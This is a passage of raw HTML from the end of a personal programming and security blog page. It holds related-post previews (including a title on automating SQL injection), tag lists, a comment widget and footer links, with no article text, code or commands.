/img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-1800w.webp 1800w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Automating Boolean-Based SQL Injection with Python</h2><div class="post-summary"><p>How to be efficiently lazy at finding hidden gems in predictable places –&nbsp;Database Edition</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/sql/" itemprop="keywords">sql</a> </span><span><a class="jtag" href="/tags/python/" itemprop="keywords">python</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/delay-and-interactive-pause-in-multithreaded-python/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/delay-and-interactive-pause-in-multithreaded-python/"><img class="post-img-blurred-bg" src="/img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 384" alt="Thumbnail for Delay and Interactive Pause in Multi-Threaded Python" srcset="/img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-256w.webp 256w, /img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-512w.webp 512w, /img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-1024w.webp 1024w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 384" alt="Thumbnail for Delay and Interactive Pause in Multi-Threaded Python" srcset="/img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-256w.webp 256w, /img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-512w.webp 512w, /img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-1024w.webp 1024w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Delay and Interactive Pause in Multi-Threaded Python</h2><div class="post-summary"><p>It's like musical chairs for threads (except no one gets left behind)!</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/python/" itemprop="keywords">python</a> </span><span><a class="jtag" href="/tags/tutorial/" itemprop="keywords">tutorial</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/linux-cheatsheet/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/linux-cheatsheet/"><img class="post-img-blurred-bg" src="/img/posts/programming/cheatsheets/assets/penguin-500w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 500 / 281" alt="Thumbnail for Practical Linux Tricks for the Aspiring Hacker" srcset="/img/posts/programming/cheatsheets/assets/penguin-256w.webp 256w, /img/posts/programming/cheatsheets/assets/penguin-500w.webp 500w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 500px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/programming/cheatsheets/assets/penguin-500w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 500 / 281" alt="Thumbnail for Practical Linux Tricks for the Aspiring Hacker" srcset="/img/posts/programming/cheatsheets/assets/penguin-256w.webp 256w, /img/posts/programming/cheatsheets/assets/penguin-500w.webp 500w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 500px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Practical Linux Tricks for the Aspiring Hacker</h2><div class="post-summary"><p>A curated list of fanciful Linux tricks I use to bolster my command-line prowess and activate Sage Mode.</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/cheatsheet/" itemprop="keywords">cheatsheet</a> </span><span><a class="jtag" href="/tags/linux/" itemprop="keywords">linux</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/subtype-metaprogramming-is-mostly-harmless/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/subtype-metaprogramming-is-mostly-harmless/"><img class="post-img-blurred-bg" src="/img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 249" alt="Thumbnail for N[Subtype Metaprogramming] is N[Mostly Harmless]" srcset="/img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-256w.webp 256w, /img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-512w.webp 512w, /img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-804w.webp 804w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 249" alt="Thumbnail for N[Subtype Metaprogramming] is N[Mostly Harmless]" srcset="/img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-256w.webp 256w, /img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-512w.webp 512w, /img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-804w.webp 804w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title"><sub><sup>N[</sup></sub>Subtype Metaprogramming<sub><sup>]</sup></sub> is <sub><sup>N[</sup></sub>Mostly Harmless<sub><sup>]</sup></sub></h2><div class="post-summary"><p>Inheritance go brrrrrrrr... abusing turing-complete typesystems to write fun programs in Python.</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/types/" itemprop="keywords">types</a></span></div></div></div></div></article></div></div><hr><h3><i class="fas fa-tags me-2"></i>Related Tags</h3><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to ctf, infosec">software.security</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/ctf/">ctf</a> <a class="jtag" href="/tags/infosec/">infosec</a> <a class="jtag" href="/tags/reverse/">reverse</a> <a class="jtag" href="/tags/pentesting/">pentesting</a> <a class="jtag" href="/tags/pwn/">pwn</a> <a class="jtag" href="/tags/cryptography/">cryptography</a> <a class="jtag" href="/tags/redteam/">redteam</a> <a class="jtag" href="/tags/stego/">stego</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to linux, programming, web, windows">software.general</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/programming/">programming</a> <a class="jtag" href="/tags/software-engineering/">software-engineering</a> <a class="jtag" href="/tags/web/">web</a> <a class="jtag" href="/tags/aoc/">aoc</a> <a class="jtag" href="/tags/apps/">apps</a> <a class="jtag" href="/tags/dsp/">dsp</a> <a class="jtag" href="/tags/programming-languages/">programming-languages</a> <a class="jtag" href="/tags/linux/">linux</a> <a class="jtag" href="/tags/performance/">performance</a> <a class="jtag" href="/tags/functional/">functional</a> <a class="jtag" href="/tags/types/">types</a> <a class="jtag" href="/tags/windows/">windows</a> <a class="jtag" href="/tags/ai/">ai</a> <a class="jtag" href="/tags/metaprogramming/">metaprogramming</a> <a class="jtag" href="/tags/oop/">oop</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to python">software.programming-language</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/cpp/">cpp</a> <a class="jtag" href="/tags/python/">python</a> <a class="jtag" href="/tags/c/">c</a> <a class="jtag" href="/tags/haskell/">haskell</a> <a class="jtag" href="/tags/js/">js</a> <a class="jtag" href="/tags/qt/">qt</a> <a class="jtag" href="/tags/rust/">rust</a> <a class="jtag" href="/tags/qml/">qml</a> <a class="jtag" href="/tags/sql/">sql</a> <a class="jtag" href="/tags/scala/">scala</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to notes, tutorial">misc</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/writeup/">writeup</a> <a class="jtag" href="/tags/notes/">notes</a> <a class="jtag" href="/tags/tutorial/">tutorial</a> <a class="jtag" href="/tags/reflection/">reflection</a> <a class="jtag" href="/tags/hkust/">hkust</a> <a class="jtag" href="/tags/project/">project</a> <a class="jtag" href="/tags/experience/">experience</a> <a class="jtag" href="/tags/faith/">faith</a> <a class="jtag" href="/tags/meta/">meta</a> <a class="jtag" href="/tags/learning/">learning</a> <a class="jtag" href="/tags/mathematics/">mathematics</a> <a class="jtag" href="/tags/cheatsheet/">cheatsheet</a> <a class="jtag" href="/tags/research/">research</a> <a class="jtag" href="/tags/satire/">satire</a> <a class="jtag" href="/tags/essay/">essay</a> <a class="jtag" href="/tags/reading/">reading</a></span></div></div><hr class="section-sep"><div class="container-md mt-4 p-4"><a id="comments"></a><p><em>Comments are back! Privacy-focused, without ads, bloatware 🤮, and trackers. Be one of the first to contribute to the discussion — I'd love to hear your thoughts.</em></p><script defer src="https://trebledj.me/js/comentario.min.js"></script><comentario-comments id="comentario" auto-init="false" no-fonts="true" css-override="false" theme="dark"></comentario-comments></div><br></div></div></article></div></div></div><footer class="d-flex flex-column gap-2"><div class="d-flex flex-row gap-3 mx-auto" style="width:fit-content;"><a rel="me noreferrer" href="https://github.com/TrebledJ" target="_blank"><i class="social-icon fab fa-github" style="color:rgb(150, 60, 180) !important;"></i> </a><a rel="me noreferrer" href="https://stackoverflow.com/users/10239789/trebledj" target="_blank"><i class="social-icon fab fa-stack-overflow" style="color:rgb(236, 124, 34) !important;"></i> </a><a rel="me noreferrer" href="https://www.codingame.com/profile/8444100ecb9723c1ec542346b0630aaa2821532" target="_blank"><i class="social-icon d-flex flex-column"><img src="/img/logos/codingame.webp" alt="" loading="lazy" decoding="async"></i></a><a rel="me noreferrer" href="https://soundcloud.com/trebledj" target="_blank"><i class="social-icon fab fa-soundcloud" style="color:rgb(237, 110, 30) !important;"></i> </a><a rel="me noreferrer" href="https://musescore.com/user/20636901" target="_blank"><i class="social-icon d-flex flex-column"><img src="/img/logos/musescore.webp" alt="" loading="lazy" decoding="async"></i></a><a rel="me noreferrer" href="https://discordapp.com/users/220427982798454794" target="_blank"><i class="social-icon fab fa-discord" style="color:rgb(84, 100, 235) !important;"></i> </a><a rel="me" href="mailto:trebledjjj@gmail.com"><i class="social-icon fas fa-envelope"></i> </a><a rel="me" href="/feeds"><i class="social-icon fas fa-square-rss"></i></a></div><p>Copyright&nbsp;©&nbsp;2025&nbsp;TrebledJ • <a href="/privacy-policy">Privacy&nbsp;Policy</a> • <a href="https://github.com/TrebledJ/trebledj.github.io?tab=readme-ov-file#credits--appreciation" rel="noreferrer" target="_blank">Credits</a></p></footer><script defer src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js"></script><script>var tocOptions={tags:["h2","h3","h4"]}</script><script defer src="/cb/MPnrKnjI5w.js"></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;52d99b3d385b4c9a98ac8ad109a95a2a&quot;}"></script></body></html>